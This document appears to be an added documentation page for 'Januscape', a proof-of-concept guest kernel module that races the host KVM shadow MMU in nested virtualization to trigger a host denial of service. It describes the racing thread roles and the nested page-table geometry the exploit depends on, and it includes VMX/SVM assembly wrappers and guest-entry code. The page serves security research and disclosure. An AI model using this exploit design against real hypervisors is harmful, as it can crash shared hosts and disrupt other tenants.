@@ -1,0 +1,308 @@
+---
+title: "Januscape PoC Internal Architecture and Thread Roles"
+sidebarTitle: "Internals"
+description: "How poc.ko is structured: virt_ops abstraction, kthread roles (writer, flood, fault), page allocation helpers, and the VMX/SVM guest setup paths."
+---
+
+`poc.c` is a single self-contained kernel module that builds and operates an
+entire nested-virtualization stack from scratch inside the guest kernel. It
+initializes VMX or SVM state directly using inline assembly, constructs nested
+page tables and a minimal L2 guest image in kernel memory, launches a set of
+kthreads with distinct racing roles, and races the host KVM shadow MMU into the
+role-mismatch reuse path described in the [technical analysis](/technical/root-cause). The
+VMX and SVM backends are unified behind a `virt_ops` vtable so that the same
+exploit logic runs unmodified on both Intel and AMD.
+
+<Note>
+  The `Makefile` sets `OBJECT_FILES_NON_STANDARD_poc.o := y`, which tells the
+  kernel build system to skip BTF (BPF Type Format) generation for this object.
+  This is required because `poc.c` contains raw VMX and SVM inline assembly
+  (including `vmxon`, `vmlaunch`, `vmresume`, `vmrun`, `vmsave`, `vmload`, and
+  `clgi`/`stgi`) that the objtool stack-validation and BTF passes cannot
+  analyse and would otherwise reject at build time.
+</Note>
+
+## Thread Roles
+
+Every kthread spawned by `poc.ko` is assigned one of three roles at module
+init:
+
+```c
+#define R_WRITER 0
+#define R_FLOOD  1
+#define R_FAULT  2
+```
+
+Role assignment is determined by the CPU index and the `nflood`/`amd`
+parameters:
+
+```c
+role_of[cpu] = (cpu == 0)             ? R_WRITER :
+               (cpu <= nflood && !amd) ? R_FLOOD :
+                                          R_FAULT;
+```
+
+<CardGroup cols={3}>
+  <Card title="R_WRITER (cpu 0)" icon="pen">
+    Toggles `nest_pd[PDE_IDX]` between a 2MB huge-page PTE and a 4KB
+    table PTE in a tight loop, separated by `dwell` `cpu_relax()` spins per
+    state. This creates the non-atomic PDE window that the faulters race into.
+  </Card>
+  <Card title="R_FLOOD (Intel only)" icon="water">
+    Cycles through `NPRESS` (200) pre-built EPT roots on every vmexit by
+    rewriting `EPT_POINTER` in the VMCS. Increases shadow page cache pressure
+    on the host to widen the race window.
+  </Card>
+  <Card title="R_FAULT" icon="bolt">
+    Repeatedly enters the nested guest (L2) at the race RIP (`N_CODE` or
+    `N_CODE_RACE`), triggering EPT/NPT violations that drive the host KVM
+    shadow MMU fetch path through the vulnerable `kvm_mmu_get_child_sp()`.
+  </Card>
+</CardGroup>
+
+## `virt_ops` Abstraction
+
+The `virt_ops` struct provides a pluggable interface that allows the exploit
+body (`build_world`, the kthread loop, `vmexit_dispatch`) to be written once
+and executed identically on either backend:
+
+```c
+struct virt_ops {
+    const char *name;
+    int  (*cpu_on)(int cpu);
+    void (*cpu_off)(void);
+    u64  (*huge_pte)(u64 pa);
+    u64  (*tbl_pte)(u64 pa);
+    u64  (*leaf4k)(u64 pa);
+    u64  (*mk_root)(u64 pml4_pa);
+    int  (*vcpu_run)(int cpu);
+};
+static struct virt_ops *ops;
+```
+
+At `m_init()`, the backend is selected by the `amd` parameter:
+
+```c
+ops = amd ? &svm_ops : &vmx_ops;
+```
+
+The page-table entry constructors differ only in the bit layout expected by
+each architecture's second-stage paging hardware:
+
+```c
+/* Intel EPT */
+static u64 vmx_huge_pte(u64 pa) { return pa | EPT_LEAF | EPT_PS; }
+static u64 vmx_tbl_pte(u64 pa)  { return pa | EPT_TBL; }
+static u64 vmx_leaf4k(u64 pa)   { return pa | EPT_LEAF; }
+static u64 vmx_mk_root(u64 pml4){ return pml4 | 0x1eULL; }
+
+/* AMD NPT */
+static u64 svm_huge_pte(u64 pa) { return pa | PF_P | PF_RW | PF_US | PF_PS; }
+static u64 svm_tbl_pte(u64 pa)  { return pa | PF_P | PF_RW | PF_US; }
+static u64 svm_leaf4k(u64 pa)   { return pa | PF_P | PF_RW | PF_US; }
+static u64 svm_mk_root(u64 pml4){ return pml4; }
+```
+
+## Page Allocation Helpers
+
+All kernel pages used by the module are allocated through two thin wrappers and
+tracked in a global array for deterministic cleanup:
+
+```c
+#define MAXPG 8192
+static struct page *pages[MAXPG];
+static u8           pord[MAXPG];
+static int          npg;
+
+static void *apg(u64 *pa)               /* alloc_page, order 0 */
+static void *apg_order(int order, u64 *pa) /* alloc_pages, arbitrary order */
+static void  free_pgs(void)             /* __free_pages for all tracked pages */
+```
+
+`apg()` wraps `alloc_page(GFP_KERNEL | __GFP_ZERO)`, and `apg_order()` wraps
+`alloc_pages(GFP_KERNEL | __GFP_ZERO, order)`. Both call `track()` to record
+the page pointer and order in `pages[]`/`pord[]`. `free_pgs()` iterates that
+array and calls `__free_pages(pages[i], pord[i])`, then resets `npg` to zero.
+
+## VMX Path
+
+### `vmx_cpu_on()` — enabling VMX
+
+`vmx_cpu_on()` performs the per-CPU VMX initialization:
+
+1. Sets `CR4.VMXE` (bit 13) via a direct `mov %0,%%cr4` to enable the VMX
+   feature on this CPU.
+2. Reads `IA32_FEATURE_CONTROL` (MSR `0x3a`) and, if the lock bit is clear,
+   writes both the lock bit and the VMXON-outside-SMX enable bit (`0x5`).
+3. Allocates a zeroed page with `apg()`, writes the VMCS revision identifier
+   from `IA32_VMX_BASIC` (MSR `0x480`) into its first dword, and calls
+   `vmxon_()` — a thin inline wrapper around the `VMXON` instruction:
+
+```c
+static inline int vmxon_(u64 pa)
+{
+    u8 e;
+    asm volatile("vmxon %1; setna %0" : "=r"(e) : "m"(pa) : "cc", "memory");
+    return e;
+}
+```
+
+### VMX instruction wrappers
+
+All VMCS manipulation uses inline wrappers that map directly onto the
+underlying VMX instructions:
+
+```c
+static inline int  vmclear_(u64 pa)       /* VMCLEAR */
+static inline int  vmptrld_(u64 pa)       /* VMPTRLD */
+static inline int  vmwrite_(u64 f, u64 v) /* VMWRITE */
+static inline u64  vmread_(u64 f)         /* VMREAD */
+static inline void vmxoff_(void)          /* VMXOFF */
+```
+
+### `vmx_vcpu_run()` — VMCS setup and guest entry
+
+`vmx_vcpu_run()` allocates a VMCS page, stamps the revision ID, calls
+`VMCLEAR` then `VMPTRLD` to make it current, and writes all required VMCS
+fields for a 64-bit long-mode guest with EPT enabled (`SEC_EPT`). Host state
+is saved by `set_host_state()` which reads the live descriptor tables, segment
+selectors, CR0/CR3/CR4, and MSRs via `sgdt`, `sidt`, `str`, `mov %cr*`, and
+`rdmsr`. Flood threads have their `EPT_POINTER` overwritten to `press_root[0]`
+before entry.
+
+Guest entry uses the `run_guest()` function, which is a `noinline` asm block
+that saves callee-saved registers, writes `H_RSP`/`H_RIP` into the VMCS via
+`VMWRITE`, executes `VMLAUNCH`, and on every subsequent vmexit calls
+`vmexit_dispatch()` before executing `VMRESUME`:
+
+```c
+static noinline void run_guest(void)
+{
+    asm volatile(
+        "   push    %%rbp\n    push    %%rbx\n  ...  \n"
+        "   mov     $0x6c14, %%rdx\n vmwrite %%rsp, %%rdx\n"
+        "   lea     1f(%%rip), %%rax\n mov $0x6c16, %%rdx\n vmwrite %%rax, %%rdx\n"
+        "   vmlaunch\n    jmp     3f\n"
+        "1: call    vmexit_dispatch\n test    %%rax, %%rax\n jnz     2f\n vmresume\n"
+        "3:\n"
+        "2: pop     %%r15\n ...  \n" :: : "rax","rcx","rdx",...);
+}
+```
+
+### `vmexit_dispatch()` — C-level vmexit handler
+
+On every vmexit, the assembly stub calls `vmexit_dispatch()`. For flood
+threads it increments `flood_loops`, selects the next EPT root from the
+`press_root[]` cycle, and resets guest RIP/RSP/RFLAGS before returning 0
+(resume). For faulter threads it calls `next_grip()` to choose between
+`N_CODE` (non-race) and `N_CODE_RACE` (race) RIPs and likewise resets guest
+state before resuming. Returning 1 signals the asm stub to exit the guest loop
+entirely.
+
+## SVM Path
+
+### `svm_cpu_on()` — enabling SVM
+
+`svm_cpu_on()` sets `EFER.SVME` (bit 12) via `wrmsr_(MSR_EFER, ...)`,
+allocates a zeroed host-save area page and writes its physical address to
+`MSR_VM_HSAVE_PA`, then allocates separate per-CPU pages for the host-state
+VMCB and the guest VMCB.
+
+### `svm_vcpu_run()` — VMCB setup and guest entry loop
+
+`svm_vcpu_run()` zeroes the guest VMCB, configures the control area
+(intercepts for `VMRUN`, `VMMCALL`, and `HLT`; ASID 1; NPT enabled via
+`VMCB_NP_CTL` with `SVM_NESTED_CTL_NP_ENABLE`; `nested_cr3` set to
+`the_root`), and fills the save area with a complete 64-bit long-mode guest
+state. Unlike the VMX path, SVM vmexit handling is a simple C loop: after each
+`svm_do_vmrun()` returns, the exit code in `c->exit_code` is classified
+(`VMMCALL`=`0x81`, `NPF`=`0x400`, `HLT`=`0x78`, error=`0xffffffff`) and
+counters are incremented. The next RIP is set before each `svm_do_vmrun()`
+call rather than inside a dispatch function.
+
+### `svm_do_vmrun()` — VMRUN wrapper
+
+`svm_do_vmrun()` is a `noinline` asm function that performs the
+`CLGI`/`STGI`-bracketed `VMSAVE`/`VMLOAD`/`VMRUN` sequence that AMD SVM
+requires to atomically save/restore host and guest state:
+
+```c
+static noinline void svm_do_vmrun(u64 gpa, u64 hpa)
+{
+    u64 g = gpa, h = hpa;
+    asm volatile("  clgi\n"
+                 "  mov     %1, %%rax\n vmsave\n"
+                 "  mov     %0, %%rax\n vmload\n"
+                 "  vmrun\n"
+                 "  mov     %0, %%rax\n vmsave\n"
+                 "  mov     %1, %%rax\n vmload\n"
+                 "  stgi\n"
+                 : "+m"(g), "+m"(h)
+                 :
+                 : "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8", "r9",
+                   "r10", "r11", "memory", "cc");
+}
+```
+
+Guest and host physical addresses are passed through memory operands (`+m`) so
+they survive the guest clobbering GPRs during `VMRUN`. The host RSP, RIP, and
+RAX are automatically saved to `VM_HSAVE_PA` by the processor on `VMRUN` and
+restored on `VMEXIT`.
+
+## `build_world()` — Page Tables and Guest Image
+
+`build_world()` constructs all nested page-table structures and the L2 guest
+image in a single function called from `m_init()`:
+
+1. Allocates `low_va` (512 pages, order 9) as the L2 physical address space
+   and `greg_va` (512 pages, order 9) as the shared PT/large-page page.
+2. Allocates `q_va` (1 page) as the probe page and fills it with
+   `0x4141414141414141`.
+3. Builds the nested PML4 → PDPT → PD → PT chain, installing `ptg` (which
+   shares its physical address with `greg_va`) as both the target of a 2MB
+   huge PTE at `nest_pd[PDE_IDX]` and as a page-table page pointed to by the
+   same PDE when toggled to table mode. This is the gfn-match / role-mismatch
+   geometry the exploit depends on.
+4. Writes the L2 guest code (`ncode`) — a `movabs rax, GVA; mov rax,[rax];
+   vmcall/vmmcall` sequence — at `N_CODE` and `N_CODE_RACE` offsets within
+   `low_va`.
+5. On Intel, allocates `NPRESS` (200) independent EPT hierarchies for the
+   flood path and records their roots in `press_root[]`.
+
+## Diagnostic Output
+
+With the default `diag=1`, the module emits the following to the kernel log:
+
+```text
+poc[VMX/EPT]: world built root=... greg=... q=... (S.gfn=... prime_gfn=... q_gfn=...)
+[*] poc step 1/4: backend=VMX/EPT ready (rmmod kvm_intel done)
+[*] poc step 2/4: nested page tables + L3 guest image built
+[*] poc step 3/4: launching N kthreads (1 writer + F faulters)
+[*] poc step 4/4: race live -- host DoS triggering
+```
+
+With `diag=2`, faulter threads additionally log the first `0x4141` probe read
+(confirming the race window was entered) and periodic SVM exit-code histograms.
+
+## Cleanup — `m_exit()`
+
+The module exit function performs an orderly shutdown:
+
+```c
+static void __exit m_exit(void)
+{
+    int c;
+    stop_all = 1;
+    msleep(200);
+    for (c = 0; c < NR_CPUS; c++)
+        if (threads[c] && !IS_ERR(threads[c]))
+            kthread_stop(threads[c]);
+    free_pgs();
+    pr_info("poc: unloaded\n");
+}
+```
+
+It sets the global `stop_all` flag (checked on every vmexit and in every
+writer/SVM loop iteration), sleeps 200 ms to let all kthreads observe the
+flag and exit their guest loops, then calls `kthread_stop()` on every thread
+and `free_pgs()` to release all allocated pages.
